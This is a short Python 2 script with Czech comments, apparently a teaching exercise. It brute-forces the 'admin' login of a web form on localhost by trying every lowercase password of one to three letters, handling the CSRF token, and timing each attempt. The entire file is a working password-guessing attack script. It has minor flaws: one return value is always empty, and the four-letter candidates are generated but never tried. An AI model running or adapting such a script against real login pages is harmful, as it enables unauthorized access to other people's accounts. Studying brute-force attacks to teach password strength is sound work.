# -*- coding: utf-8 -*-

import itertools
import time
import sys
import requests

"""
priklad

a
z
aa
ab
ac
zz
aaa
dfg
zzz
aaaa
zzzz
"""

passwords = []
for repeat in range(1, 5):
    passwords.append(list(itertools.product('abcdefghijklmnopqrstuvwxyz', repeat=repeat)))
    # print len(passwords[repeat-1])

# odesilame hesla o delce 1

def zkus_heslo(heslo):
    heslo = ''.join(heslo)
    pred = time.time()
    vysledek = zkus_na_strance(heslo)
    po = time.time()
    print "zkousim heslo", heslo, "za %.2f" % (po - pred), 's'
    return vysledek


def zkus_na_strance(heslo):
    adresa = 'http://localhost:8000/'
    odpoved = requests.get(adresa)
    if odpoved.ok:
        csrf = odpoved.cookies['csrftoken']
        post_odpoved = requests.post(adresa, data={'username': 'admin', 'password': heslo, 'csrfmiddlewaretoken': csrf},
                                     cookies=dict(csrftoken=csrf), allow_redirects=False)
        if post_odpoved.is_redirect:
            # jsme presmerovani a heslo je ok
            print 'Heslo je %s' % heslo
            sys.exit()
    else:
        print 'Chyba! Stránka odpověděla statusem %s' % odpoved.status_code


hesla_1 = passwords[0]
for heslo in hesla_1:
    zkus_heslo(heslo)

hesla_2 = passwords[1]
for heslo in hesla_2:
    if zkus_heslo(heslo):
        print 'Heslo je %s' % heslo
        sys.exit()

hesla_3 = passwords[2]
for heslo in hesla_3:
    zkus_heslo(heslo)


